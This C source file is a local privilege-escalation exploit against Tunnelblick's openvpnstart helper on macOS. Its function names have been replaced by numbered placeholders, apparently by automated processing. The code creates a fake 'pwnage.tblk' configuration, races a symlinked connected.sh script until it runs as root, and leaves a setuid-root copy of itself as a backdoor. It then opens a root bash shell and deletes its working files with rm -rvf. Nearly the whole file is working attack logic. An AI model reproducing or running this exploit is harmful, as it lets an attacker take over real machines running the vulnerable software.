#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint32_t ;
typedef  int /*<<< orphan*/  script ;
typedef  int pid_t ;
typedef  int /*<<< orphan*/  pid_file ;
typedef  int /*<<< orphan*/  path ;
typedef  int /*<<< orphan*/  dir ;
typedef  int /*<<< orphan*/  command ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int S_ISUID ; 
 int S_IXOTH ; 
 int /*<<< orphan*/  FUNC0 (char*,int*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,char*,...) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC6 (char*,char*) ; 
 int FUNC7 () ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,char*,int,int) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ *,char*,int*,int*) ; 
 char* FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 () ; 
 int FUNC12 () ; 
 int /*<<< orphan*/  FUNC13 (int,int) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC17 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC18 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC19 (char*,int,char*,char*) ; 
 int /*<<< orphan*/  FUNC20 (char*,char*) ; 
 int /*<<< orphan*/  FUNC21 (char*,char*) ; 
 int /*<<< orphan*/  FUNC22 (char*) ; 
 int /*<<< orphan*/  FUNC23 (char*) ; 
 int /*<<< orphan*/  FUNC24 (int /*<<< orphan*/ *) ; 

int FUNC25(int argc, char *argv[])
{
	char dir[512];
	char script[512];
	char command[512];
	char pid_file[512];
	char path[512];
	char self[512];
	uint32_t size;
	pid_t pid, pid2;
	FILE *file;
	
	FUNC19(dir, sizeof(dir), "%s/Library/Application Support/Tunnelblick/Configurations/pwnage.tblk/Contents/Resources", FUNC10("HOME"));
	FUNC19(pid_file, sizeof(pid_file), "%s/exploit.pid", dir);

	/* Oh god, do I miss /proc/self/exe. */
	if (FUNC10("PWNPATH"))
		FUNC20(self, FUNC10("PWNPATH"));
	else {
		size = sizeof(path);
		FUNC0(path, &size);
		FUNC15(path, self);
		FUNC16("PWNPATH", self, 1);
	}

	if (!FUNC11()) {
		file = FUNC6(pid_file, "r");
		if (file) {	
			FUNC14("[+] Making backdoor.\n");
			FUNC2(self, 0, 0);
			FUNC1(self, S_ISUID | S_IXOTH);

			FUNC14("[+] Cleaning up.\n");
			FUNC9(file, "%d %d", &pid, &pid2);
			FUNC5(file);
			FUNC19(command, sizeof(command), "rm -rvf '%s/../../../'", dir);
			FUNC22(command);
		
			FUNC14("[+] Complete. Run this again to get root.\n");
			FUNC13(pid2, 9);
			FUNC13(pid, 9);
			return 0;
		}
		FUNC14("[+] Getting root.\n");
		FUNC18(0);
		FUNC17(0);
		FUNC4("/bin/bash", "bash", NULL);
	}


	FUNC14("[+] Creating vulnerable directory.\n");
	FUNC19(command, sizeof(command), "mkdir -p -v '%s'", dir);
	FUNC22(command);

	pid = FUNC7();
	if (!pid) {
		FUNC14("[+] Running toggler.\n");
		FUNC19(script, sizeof(script), "%s/connected.sh", dir);
		for (;;) {
			FUNC23(script);
			FUNC21("/Applications/Tunnelblick.app/Contents/Resources/client.down.tunnelblick.sh", script);
			FUNC23(script);
			FUNC21(self, script);
		}
	} else {
		FUNC14("[+] Writing pid and executing vulnerable program.\n");
		file = FUNC6(pid_file, "w");
		FUNC8(file, "%d %d", pid, FUNC12());
		FUNC5(file);
		for (;;) {
			if (FUNC7())
				FUNC24(NULL);
			else {
				FUNC3(0);
				FUNC3(2);
				FUNC4("/Applications/Tunnelblick.app/Contents/Resources/openvpnstart", "openvpnstart", "connected", "pwnage.tblk", "0", NULL);
			}
		}
	}

	return 0;	
}